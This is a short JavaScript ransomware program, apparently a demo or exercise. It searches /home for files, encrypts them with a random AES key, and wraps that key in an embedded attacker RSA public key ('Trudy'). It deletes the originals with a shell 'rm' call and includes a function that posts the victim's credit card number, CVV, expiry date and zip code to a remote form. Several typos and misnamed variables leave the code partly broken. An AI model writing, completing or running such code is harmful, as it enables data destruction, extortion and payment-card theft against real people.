var fileFinder = require('fs-finder');
var fileStream = require('fs');
var ursa = require('ursa');

var pubkeyTrudy = '-----BEGIN PUBLIC KEY-----\n'+
'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZSCnqlU26QVvPINDZ5Om4nSG0\n'+
'lLIbzgpEh4IEo9CFIN8E29LrqdW+D3p6mAjy2QO882ogMqjsrPhH3XSg/C46QcSg\n'+
'1wXfv0p6qN1uIOvtVU1ItZ0l9TFwhC/mjhWoPWSEiSa3Ccw8g80iTExOzXVTjZp9\n'+
'mQmilgQsNiTzlPmGgQIDAQAB\n'+
'-----END PUBLIC KEY-----\n';
var encryptedKey='';

var crypto = require('crypto'),
algorithm = 'aes-256-ctr'
//console.log(password);

var files = fileFinder.from('/home').findFiles('*.foo');
var encryptedFiles = [];

// function encrypt(text){
//   var cipher = crypto.createCipher(algorithm,password)
//   var crypted = cipher.update(text,'utf8','hex')
//   crypted += cipher.final('hex');
//   return crypted;
// }

// function decrypt(text){
//   var decipher = crypto.createDecipher(algorithm,password)
//   var dec = decipher.update(text,'hex','utf8')
//   dec += decipher.final('utf8');
//   return dec;
// }

function encryptFiles(files){
	var secureRandom = require('secure-random-string');
  var password = secureRandom(64);
  var pubkey = ursa.createPublicKey(pubkeyTrudy);
  encryptedKey = pubkey.encrypt(password, 'utf8', 'base64');
  var cipher = crypto.createCipher(algorithm,password);

  files.forEach(function(file) { 
   var input = fileStream.createReadStream(file);
   var output = fileStream.createWriteStream(file +'.lock');
   input.pipe(cipher).pipe(output);
   ecryptedFiles.push(file +'.lock');
 });
}

function deCryptFiles(key){
	var deCipher = crypto.createDecipher(algorithm, key);

  encryptedFiles.forEach(function(file) {
   var input = fileStream.createReadStream(file);
   var output = fileStream.createWriteStream(file.slice(0, -5));
   input.pipe(deCipher).pipe(output);
 });
}

function deleteOriginalFiles(files) {
  var sys = require('sys');
  var exe = requre('child-process').exec;
  files.forEach(function(file) {
   exec("rm " + file);
 });
}

function sendCCToTrudy(cardNumber, backNumbers, expiryDate, zip) {
  //var pubkey = ursa.createPublicKey(pubkeypem);
  var request = require('request');
  
  request.post(
    'http://www.yoursite.com/formpage',
    { json: { 
      key: encryptedKey,
      CcardNumber: cardNumber,
      backThree: backNumbers,
      expDate: expiryDate,
      zipCode: zip
    }
  },
  function (error, response, body) {
    if (!error && response.statusCode == 200) {
      return body;
    }
  });
}

var hw = "Hello World";

encryptFiles(files);
deleteOriginalFiles(files);
console.log(encryptedFiles);


//console.log(currentPath);

console.log(files);
